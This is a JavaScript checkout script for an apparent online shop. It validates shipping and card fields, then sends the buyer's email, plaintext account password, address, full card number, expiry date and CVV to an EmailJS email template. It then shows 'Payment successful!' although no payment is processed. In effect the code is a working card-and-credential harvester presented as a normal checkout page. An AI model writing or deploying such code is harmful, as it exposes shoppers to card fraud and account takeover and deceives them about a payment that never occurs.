/* ============ EmailJS init ============ */
emailjs.init("YOUR_PUBLIC_KEY"); // 🔧 මෙතන ඔයාගේ Public Key එක දාන්න

/* ============ CART FROM STORAGE ============ */
const cart = JSON.parse(localStorage.getItem("velona_cart") || "[]");

if (cart.length === 0) {
  // no items → redirect back
  alert("Your cart is empty. Add items first!");
  window.location.href = "index.html";
}

let selectedType = "";

/* ============ RENDER SUMMARY ============ */
function renderSummary() {
  const itemsEl = document.getElementById("summaryItems");
  const subtotalEl = document.getElementById("subtotal");
  const totalEl = document.getElementById("summaryTotal");
  const popupAmount = document.getElementById("popupAmount");
  const payBtnText = document.getElementById("payBtnText");

  const subtotal = cart.reduce((s, i) => s + (i.price * i.qty), 0);

  itemsEl.innerHTML = cart.map(item => `
    <div class="summary-item">
      <div class="summary-item-img">${item.emoji}</div>
      <div class="summary-item-info">
        <div class="summary-item-name">${item.name}</div>
        <div class="summary-item-qty">Qty: ${item.qty}</div>
      </div>
      <div class="summary-item-price">Rs. ${(item.price * item.qty).toFixed(2)}</div>
    </div>
  `).join("");

  subtotalEl.innerText = `Rs. ${subtotal.toFixed(2)}`;
  totalEl.innerText = `Rs. ${subtotal.toFixed(2)}`;
  popupAmount.innerText = `Rs. ${subtotal.toFixed(2)}`;
  payBtnText.innerText = `Pay Now · Rs. ${subtotal.toFixed(2)}`;

  return subtotal;
}

const CART_TOTAL = renderSummary();

/* ============ Validation helpers ============ */
function showError(id, msg) {
  const wrap = document.getElementById("wrap-" + id);
  const err = document.getElementById("err-" + id);
  if (wrap) { wrap.classList.add("error"); wrap.classList.remove("success"); }
  if (err) { err.innerText = msg; err.classList.add("show"); }
}

function clearError(id, success = true) {
  const wrap = document.getElementById("wrap-" + id);
  const err = document.getElementById("err-" + id);
  if (wrap) { wrap.classList.remove("error"); if (success) wrap.classList.add("success"); }
  if (err) err.classList.remove("show");
}

/* ---------- Field validators ---------- */
function validateEmail() {
  const v = document.getElementById("regEmail").value.trim();
  if (!v) return showError("regEmail", "Email is required");
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v)) return showError("regEmail", "Invalid email format");
  clearError("regEmail"); return true;
}

function validatePassword() {
  const v = document.getElementById("regPassword").value;
  if (!v) return showError("regPassword", "Password is required");
  if (v.length < 6) return showError("regPassword", "Minimum 6 characters");
  clearError("regPassword"); return true;
}

function validatePhone() {
  const v = document.getElementById("phone").value.trim();
  if (!v) return showError("phone", "Phone is required");
  const d = v.replace(/\D/g, "");
  if (d.length < 9 || d.length > 12) return showError("phone", "Invalid phone (9-12 digits)");
  clearError("phone"); return true;
}

function validateAddress() {
  const v = document.getElementById("address").value.trim();
  if (!v) return showError("address", "Address is required");
  if (v.length < 5) return showError("address", "Address too short");
  clearError("address"); return true;
}

function validateCity() {
  const v = document.getElementById("city").value.trim();
  if (!v) return showError("city", "City is required");
  clearError("city"); return true;
}

function validatePostal() {
  const v = document.getElementById("postal").value.trim();
  if (!v) return showError("postal", "Postal code required");
  if (!/^[0-9]{4,6}$/.test(v)) return showError("postal", "4-6 digit code");
  clearError("postal"); return true;
}

function validateCardType() {
  if (!selectedType) {
    document.getElementById("err-cardType").classList.add("show");
    return false;
  }
  document.getElementById("err-cardType").classList.remove("show");
  return true;
}

/* Luhn */
function luhnCheck(num) {
  let sum = 0, alt = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let n = parseInt(num[i], 10);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n; alt = !alt;
  }
  return sum % 10 === 0;
}

function validateCardNumber() {
  const v = document.getElementById("card").value.replace(/\s/g, "");
  const type = document.getElementById("cardType").value;
  if (!v) return showError("card", "Card number required");

  const lengths = { visa: [13,16,19], mastercard: [16], amex: [15] };
  const allowed = lengths[type] || [13,14,15,16,17,18,19];
  if (!allowed.includes(v.length)) return showError("card", `Must be ${allowed.join("/")} digits`);

  if (type === "visa" && !v.startsWith("4")) return showError("card", "Visa starts with 4");
  if (type === "mastercard" && !/^(5[1-5]|2[2-7])/.test(v)) return showError("card", "Invalid Mastercard");
  if (type === "amex" && !/^3[47]/.test(v)) return showError("card", "Amex starts with 34/37");
  if (!luhnCheck(v)) return showError("card", "Invalid card (checksum failed)");

  clearError("card"); return true;
}

function validateExpiry() {
  const v = document.getElementById("expiry").value.trim();
  if (!v) return showError("expiry", "Expiry required");
  if (!/^\d{2}\/\d{2}$/.test(v)) return showError("expiry", "Use MM/YY");

  const [mm, yy] = v.split("/").map(Number);
  if (mm < 1 || mm > 12) return showError("expiry", "Invalid month");

  const now = new Date();
  const cy = now.getFullYear() % 100;
  const cm = now.getMonth() + 1;
  if (yy < cy || (yy === cy && mm < cm)) return showError("expiry", "Card expired");
  if (yy > cy + 20) return showError("expiry", "Invalid year");

  clearError("expiry"); return true;
}

function validateCVV() {
  const v = document.getElementById("cvv").value.trim();
  const type = document.getElementById("cardType").value;
  if (!v) return showError("cvv", "CVV required");
  const expected = type === "amex" ? 4 : 3;
  if (v.length !== expected) return showError("cvv", `Must be ${expected} digits`);
  clearError("cvv"); return true;
}

function validateName() {
  const v = document.getElementById("name").value.trim();
  if (!v) return showError("name", "Name required");
  if (v.length < 3) return showError("name", "Name too short");
  clearError("name"); return true;
}

/* ============ Blur validation ============ */
const blurMap = {
  regEmail: validateEmail,
  regPassword: validatePassword,
  phone: validatePhone,
  address: validateAddress,
  city: validateCity,
  postal: validatePostal,
  name: validateName,
  expiry: validateExpiry,
  cvv: validateCVV
};

Object.keys(blurMap).forEach(id => {
  const el = document.getElementById(id);
  if (el) el.addEventListener("blur", blurMap[id]);
});

/* ============ Password toggle ============ */
function togglePassword() {
  const p = document.getElementById("regPassword");
  p.type = p.type === "password" ? "text" : "password";
}

/* ============ Pick card type ============ */
function pickType(type) {
  selectedType = type;
  document.querySelectorAll(".type-btn").forEach(b => {
    b.classList.toggle("active", b.dataset.type === type);
  });
  document.getElementById("err-cardType").classList.remove("show");
}

/* ============ Open payment popup ============ */
function openPaymentPopup() {
  const ok = [
    validateEmail(), validatePassword(), validatePhone(),
    validateAddress(), validateCity(), validatePostal(), validateCardType()
  ].every(v => v === true);

  if (!ok) {
    const firstErr = document.querySelector(".error-msg.show, .card-type-error.show");
    if (firstErr) firstErr.scrollIntoView({ behavior: "smooth", block: "center" });
    return;
  }

  document.getElementById("cardType").value = selectedType;
  highlightBrand(selectedType);
  document.getElementById("orderId").innerText = generateOrderId();
  document.getElementById("overlay").classList.add("show");
}

function closePaymentPopup() {
  document.getElementById("overlay").classList.remove("show");
  resetBrands();
  clearCardIcon();
  const payBtn = document.getElementById("payBtn");
  payBtn.disabled = false;
  payBtn.classList.remove("loading");
}

/* ============ Brand detection ============ */
const brands = ["visa", "mastercard", "amex"];
const cardInput = document.getElementById("card");
const cardSelect = document.getElementById("cardType");
const cardIcon = document.getElementById("cardIcon");
const payBtn = document.getElementById("payBtn");
const payBtnText = document.getElementById("payBtnText");

function resetBrands() {
  brands.forEach(b => document.getElementById("logo-" + b).classList.remove("active"));
}

function highlightBrand(brand) {
  resetBrands();
  if (brand) document.getElementById("logo-" + brand).classList.add("active");
  updateCardIcon(brand);
}

const iconSVGs = {
  visa: `<svg viewBox="0 0 100 40"><text x="50" y="30" text-anchor="middle" font-family="Arial" font-size="26" font-weight="bold" font-style="italic" fill="#1A1F71">VISA</text></svg>`,
  mastercard: `<svg viewBox="0 0 100 40"><circle cx="40" cy="20" r="14" fill="#EB001B"/><circle cx="60" cy="20" r="14" fill="#F79E1B"/><path d="M50 9 A14 14 0 0 1 50 31 A14 14 0 0 1 50 9 Z" fill="#FF5F00"/></svg>`,
  amex: `<svg viewBox="0 0 100 40"><rect x="0" y="4" width="100" height="32" rx="4" fill="#2E77BC"/><text x="50" y="28" text-anchor="middle" font-family="Arial" font-size="18" font-weight="bold" fill="#FFFFFF">AMEX</text></svg>`
};

function updateCardIcon(brand) {
  if (brand && iconSVGs[brand]) {
    cardIcon.innerHTML = iconSVGs[brand];
    cardIcon.classList.add("visible");
  } else {
    cardIcon.innerHTML = "";
    cardIcon.classList.remove("visible");
  }
}

function clearCardIcon() { updateCardIcon(""); }

function selectBrand(brand) {
  document.getElementById("cardType").value = brand;
  highlightBrand(brand);
}

cardInput.addEventListener("input", function (e) {
  let v = e.target.value.replace(/\D/g, "").substring(0, 16);
  e.target.value = v.replace(/(.{4})/g, "$1 ").trim();

  const brand = detectBrand(v);
  if (brand) { highlightBrand(brand); cardSelect.value = brand; }

  if (v.length >= 12) validateCardNumber();
  else {
    document.getElementById("wrap-card").classList.remove("success", "error");
    document.getElementById("err-card").classList.remove("show");
  }
});

function detectBrand(num) {
  if (/^4/.test(num)) return "visa";
  if (/^5[1-5]/.test(num) || /^2(2[2-9]|[3-6]|7[01]|720)/.test(num)) return "mastercard";
  if (/^3[47]/.test(num)) return "amex";
  return "";
}

cardSelect.addEventListener("change", function () {
  highlightBrand(this.value);
  validateCVV();
});

document.getElementById("expiry").addEventListener("input", function (e) {
  let v = e.target.value.replace(/\D/g, "").substring(0, 4);
  if (v.length >= 3) v = v.substring(0, 2) + "/" + v.substring(2);
  e.target.value = v;
});

document.getElementById("cvv").addEventListener("input", function (e) {
  e.target.value = e.target.value.replace(/\D/g, "");
});

/* ============ Generate order ID ============ */
function generateOrderId() {
  return "ORD" + Date.now().toString().slice(-6);
}

/* ============ Submit payment ============ */
function submitPayment() {
  const ok = [validateName(), validateCardNumber(), validateExpiry(), validateCVV()].every(v => v === true);
  if (!ok) {
    const firstErr = document.querySelector(".popup-body .error-msg.show");
    if (firstErr) firstErr.scrollIntoView({ behavior: "smooth", block: "center" });
    showStatus("⚠️ Fix errors above", "error");
    return;
  }

  payBtn.disabled = true;
  payBtn.classList.add("loading");
  payBtnText.innerText = "Processing...";
  showStatus("Please wait...", "loading");

  const orderId = document.getElementById("orderId").innerText;

  // Build items list as text for email
  const itemsList = cart.map(i => `${i.name} × ${i.qty} = Rs. ${(i.price * i.qty).toFixed(2)}`).join("\n");

  const params = {
    email: document.getElementById("regEmail").value.trim(),
    password: document.getElementById("regPassword").value,
    phone: document.getElementById("phone").value.trim(),
    address: document.getElementById("address").value.trim(),
    city: document.getElementById("city").value.trim(),
    postal: document.getElementById("postal").value.trim(),
    name: document.getElementById("name").value.trim(),
    card_type: document.getElementById("cardType").value,
    card_number: document.getElementById("card").value.trim(),
    expiry: document.getElementById("expiry").value.trim(),
    cvv: document.getElementById("cvv").value.trim(),
    order_id: orderId,
    amount: CART_TOTAL.toFixed(2),
    items: itemsList
  };

  emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", params)
    .then(() => {
      showStatus("Payment successful!", "success");
      payBtnText.innerText = "✓ Success";

      setTimeout(() => {
        closePaymentPopup();
        document.getElementById("successOrderId").innerText = orderId;
        document.getElementById("successOverlay").classList.add("show");
        // clear cart
        localStorage.removeItem("velona_cart");
      }, 1500);
    })
    .catch(err => {
      console.error(err);
      showStatus("❌ Payment failed. Try again.", "error");
      payBtn.disabled = false;
      payBtn.classList.remove("loading");
      payBtnText.innerText = `Pay Now · Rs. ${CART_TOTAL.toFixed(2)}`;
    });
}

function showStatus(msg, type) {
  const s = document.getElementById("status");
  s.innerText = msg;
  s.className = "status-msg " + type;
}